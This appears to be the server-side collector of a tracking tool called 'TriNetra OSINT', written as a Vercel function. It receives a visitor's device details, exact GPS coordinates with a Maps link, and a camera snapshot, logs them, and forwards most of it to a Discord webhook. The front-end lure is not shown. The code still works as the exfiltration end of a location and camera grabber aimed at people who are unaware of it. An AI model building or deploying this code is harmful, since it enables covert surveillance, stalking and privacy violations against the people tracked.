module.exports = async function(req, res) {
    // Enable CORS just in case
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const payload = req.body;

    // 1. Log to Vercel Console (You can view this in Vercel > Project > Logs)
    console.log("=== NEW TRINETRA OSINT DATA ===");
    console.log("Device Info:");
    console.log(`- User Agent: ${payload.userAgent}`);
    console.log(`- Platform: ${payload.platform}`);
    console.log(`- Resolution: ${payload.screenResolution}`);
    
    if (payload.location && payload.location.lat) {
        console.log(`Location: ${payload.location.lat}, ${payload.location.lon}`);
        console.log(`Google Maps Link: ${payload.location.gmapsLink}`);
    } else {
        console.log(`Location: ${payload.location}`); // E.g., "Permission denied"
    }

    if (payload.image && payload.image.startsWith("data:image")) {
        console.log("Image received: YES (Base64 omitted from console to save space)");
    } else {
        console.log("Image received: NO");
    }

    // 2. [Optional] Forward to Discord via Webhook
    // To use this, add a WEBHOOK_URL Environment Variable in Vercel.
    const discordWebhookUrl = process.env.WEBHOOK_URL; 
    
    if (discordWebhookUrl) {
        try {
            const embed = {
                title: "🚨 TriNetra Log Received",
                color: 16711680,
                fields: [
                    { name: "Platform", value: payload.platform || "Unknown", inline: true },
                    { name: "Resolution", value: payload.screenResolution || "Unknown", inline: true },
                    { name: "User Agent", value: payload.userAgent || "Unknown" },
                    { name: "Maps Link", value: payload.location?.gmapsLink || "Denied/Error" }
                ]
            };

            const discordPayload = { embeds: [embed] };

            await fetch(discordWebhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(discordPayload)
            });

        } catch (e) {
            console.error("Failed to send to Discord", e);
        }
    }

    return res.status(200).json({ success: true, message: "Data received" });
};
